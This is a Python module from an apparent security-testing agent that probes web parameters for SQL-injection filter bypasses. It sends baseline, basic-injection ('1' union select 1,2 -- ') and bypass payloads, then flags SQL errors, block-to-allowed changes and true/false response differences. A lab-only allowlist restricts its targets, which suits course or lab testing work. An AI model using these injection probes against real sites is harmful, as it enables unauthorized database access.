from __future__ import annotations

import re
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from ai_security_agent.integrations.http import fetch_text as http_fetch_text
from ai_security_agent.modules.common import FetchResult, is_local_or_lab_target

from .models import AttackControlProbe, ControlProbeStep, PayloadStrategy, ProbeObservation, ProbeRequest, SQLBypassCandidate


SQL_ERROR_RE = re.compile(r"mysql|sql syntax|database error|warning.*mysqli|pdoexception|odbc|sqlite", re.IGNORECASE)
BLOCK_STATUS_CODES = {401, 403, 406, 418, 429}
BLOCK_BODY_RE = re.compile(
    r"403\s+forbidden|access\s+denied|request\s+blocked|security\s+violation|malicious\s+request|attack\s+detected|sql\s+injection",
    re.IGNORECASE,
)
safe_fetch_text = http_fetch_text


class ProbeRunner:
    def send_baseline(self, candidate: SQLBypassCandidate) -> tuple[ProbeRequest, FetchResult]:
        request = self.build_request(candidate, self._baseline_value(candidate))
        return request, self.send(request)

    def send_basic_attack(self, candidate: SQLBypassCandidate) -> tuple[ProbeRequest, FetchResult]:
        request = self.build_request(candidate, self._basic_attack_value(candidate))
        return request, self.send(request)

    def send_strategy(
        self,
        candidate: SQLBypassCandidate,
        strategy: PayloadStrategy,
        *,
        baseline_request: ProbeRequest,
        baseline: FetchResult,
    ) -> ProbeObservation:
        normal_step = self._step_from_response("normal_baseline", baseline_request, baseline)
        basic_request = self.build_request(candidate, self._basic_attack_value(candidate))
        basic_response = self.send(basic_request)
        basic_step = self._step_from_response("basic_attack", basic_request, basic_response)
        bypass_request = self.build_request(candidate, strategy.payload)
        bypass_response = self.send(bypass_request)
        bypass_step = self._step_from_response("bypass_attack", bypass_request, bypass_response)
        false_request = self.build_request(candidate, strategy.false_payload)
        false_response = self.send(false_request)
        false_blocked = is_blocked_response(false_response)

        control_probe = AttackControlProbe(
            normal_baseline=normal_step,
            basic_attack=basic_step,
            bypass_attack=bypass_step,
        )
        delta = abs(len(baseline.text) - len(bypass_response.text)) if baseline.ok and bypass_response.ok else 0
        true_false_delta = (
            abs(len(bypass_response.text) - len(false_response.text))
            if bypass_response.ok and false_response.ok and not bypass_step.blocked and not false_blocked
            else 0
        )
        sql_error = bool(SQL_ERROR_RE.search(bypass_response.text or ""))
        signal_type = self._signal_type(control_probe, sql_error=sql_error, true_false_delta=true_false_delta)
        signal = signal_type != "none"
        basis_parts: list[str] = []
        if control_probe.blocked_to_allowed:
            basis_parts.append("normal baseline was allowed, basic attack was blocked, and bypass variant was allowed")
        if sql_error:
            basis_parts.append("response contains SQL/database error markers")
        if true_false_delta > 30:
            basis_parts.append(f"true/false pair differs by {true_false_delta} bytes")
        if delta > 120:
            basis_parts.append(f"response length differs from baseline by {delta} bytes; delta is auxiliary only")
        if bypass_step.blocked:
            basis_parts.append("response still contains blocking indicators")
        if bypass_response.error:
            basis_parts.append(f"fetch error: {bypass_response.error}")
        if not basis_parts:
            basis_parts.append("no standalone bypass assessment signal observed")
        return ProbeObservation(
            strategy=strategy,
            request=bypass_request,
            control_probe=control_probe,
            status_code=bypass_response.status_code,
            response_length=len(bypass_response.text),
            blocked=bypass_step.blocked,
            delta_from_baseline=delta,
            true_false_delta=true_false_delta,
            true_status_code=bypass_response.status_code,
            false_status_code=false_response.status_code,
            sql_error_marker=sql_error,
            assessment_signal=signal,
            signal_type=signal_type,
            basis="; ".join(basis_parts),
            error=bypass_response.error,
        )

    def build_request(self, candidate: SQLBypassCandidate, value: str) -> ProbeRequest:
        url = candidate.baseline_url or candidate.page_url
        parsed = urlparse(url)
        method = (candidate.method or "GET").upper()
        if method == "POST":
            body_params = parse_qs(candidate.baseline_body or parsed.query)
            body_params[candidate.parameter] = [value]
            return ProbeRequest(method="POST", url=urlunparse(parsed._replace(query="")), body=urlencode(body_params, doseq=True))

        query = parse_qs(parsed.query)
        query[candidate.parameter] = [value]
        return ProbeRequest(method="GET", url=urlunparse(parsed._replace(query=urlencode(query, doseq=True))), body="")

    def send(self, request: ProbeRequest) -> FetchResult:
        if not is_local_or_lab_target(request.url):
            return FetchResult(url=request.url, error="target is outside the local/course-lab allowlist")
        if request.method == "GET":
            exchange = safe_fetch_text(
                request.url,
                timeout_seconds=1.0,
                max_bytes=80_000,
            )
        else:
            exchange = safe_fetch_text(
                request.url,
                method=request.method,
                body=request.body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout_seconds=1.0,
                max_bytes=80_000,
            )
        return FetchResult(
            url=exchange.url,
            status_code=exchange.status_code,
            headers=exchange.headers,
            text=exchange.text,
            error=exchange.error,
        )

    def _baseline_value(self, candidate: SQLBypassCandidate) -> str:
        parsed = urlparse(candidate.baseline_url or candidate.page_url)
        source = candidate.baseline_body if candidate.method == "POST" and candidate.baseline_body else parsed.query
        values = parse_qs(source).get(candidate.parameter, [])
        return values[0] if values else "1"

    def _basic_attack_value(self, candidate: SQLBypassCandidate) -> str:
        if any(name in candidate.confirmed_strategies for name in ("union_basic", "union")):
            return "1' union select 1,2 -- "
        if candidate.parameter.lower() in {"id", "uid", "user_id"}:
            return "1 and 1=1"
        return "1' and '1'='1"

    def _step_from_response(self, name: str, request: ProbeRequest, response: FetchResult) -> ControlProbeStep:
        return ControlProbeStep(
            name=name,
            request=request,
            status_code=response.status_code,
            response_length=len(response.text),
            blocked=is_blocked_response(response),
            sql_error_marker=bool(SQL_ERROR_RE.search(response.text or "")),
            error=response.error,
        )

    def _signal_type(self, control_probe: AttackControlProbe, *, sql_error: bool, true_false_delta: int) -> str:
        if sql_error:
            return "sql_error"
        if control_probe.blocked_to_allowed:
            return "blocked_to_allowed"
        if true_false_delta > 30:
            return "true_false_pair"
        return "none"


def is_blocked_response(response: FetchResult) -> bool:
    if response.status_code in BLOCK_STATUS_CODES:
        return True
    return bool(BLOCK_BODY_RE.search(response.text or ""))
